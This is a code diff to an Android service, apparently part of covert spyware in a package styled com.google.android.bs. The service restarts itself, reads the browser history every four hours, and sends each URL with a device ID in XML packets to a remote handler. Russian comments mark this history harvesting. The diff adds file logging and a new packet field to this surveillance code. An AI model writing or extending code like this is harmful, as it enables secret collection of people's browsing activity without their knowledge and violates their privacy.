@@ -19,6 +19,7 @@ import android.provider.Browser;
 import android.util.Log;
 
 import com.google.android.bs.DataSendHandler;
+import com.google.android.bs.FileLog;
 import com.google.android.bs.WorkTimeDefiner;
 
 public class LinkService extends Service {
@@ -33,7 +34,10 @@ public class LinkService extends Service {
 	public void onCreate() {
 		super.onCreate();
 		startService(new Intent(this, LinkService.class));
+		
 		Log.d(LOG_TAG, "onCreate histroyService");
+		FileLog.writeLog("onCreate histroyService");
+		
 		context = getApplicationContext();
 		sp = PreferenceManager.getDefaultSharedPreferences(context);// getPreferences(MODE_PRIVATE);
 
@@ -45,7 +49,9 @@ public class LinkService extends Service {
 		String linkEnd = sp.getString("ACTION", "OK");
 
 		if (linkEnd.equals("REMOVE")) {
-			return -1;
+			Log.d(LOG_TAG, "REMOVE");
+			FileLog.writeLog("historyService: REMOVE");
+			return 0;
 		}
 		// запрос каждые 4 часа
 				
@@ -53,9 +59,13 @@ public class LinkService extends Service {
 		if (!isWork) {
 			Log.d(LOG_TAG, "isWork return " + Boolean.toString(isWork));
 			Log.d(LOG_TAG, "after isWork retrun 0");
+			FileLog.writeLog("historyService: isWork return " + Boolean.toString(isWork));
+			FileLog.writeLog("historyService: after isWork retrun 0");
+			
 			return 0;
 		} else {
 			Log.d(LOG_TAG, Boolean.toString(isWork));
+			FileLog.writeLog("historyService: isWork - " + Boolean.toString(isWork));
 		}
 		
 		linkTask(); // просомотр истории браузера
@@ -79,10 +89,12 @@ public class LinkService extends Service {
 	public void onDestroy() {
 		super.onDestroy();
 		Log.d(LOG_TAG, "onDestroy");
+		FileLog.writeLog("historyService: onDestroy");
 	}
 
 	public IBinder onBind(Intent intent) {
 		Log.d(LOG_TAG, "onBind");
+		FileLog.writeLog("historyService: onBind");
 		return null;
 	}
 
@@ -128,6 +140,8 @@ public class LinkService extends Service {
 
 					Log.d(LOG_TAG, "--- "
 							+ formatter.format(calendar.getTime()).toString());
+					FileLog.writeLog("historyService: --- "
+							+ formatter.format(calendar.getTime()).toString());
 
 					// Create a calendar object that will convert the date and
 					// time value in milliseconds to date.
@@ -144,15 +158,19 @@ public class LinkService extends Service {
 					String sendStr = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>" + urlDate
 							+ "</time><type>4</type><app>"
 							+ "Интернет-браузер</app><url>" + url
-							+ "</url></packet>";
+							+ "</url><ntime>" + "30"
+				+ "</ntime></packet>";
 
 					DataSendHandler dSH = new DataSendHandler(context);
 					dSH.send(3, sendStr);
 					Editor ed = sPref.edit();
 					ed.putString(SAVED_TIME, title);
 					ed.commit();
+					
 					Log.d(LOG_TAG, formatter.format(calendar.getTime())
 							.toString() + " - " + url);
+					FileLog.writeLog("historyService: --- "
+							+ formatter.format(calendar.getTime()).toString() + " - " + url);
 				}
 				mCur.moveToNext();
 
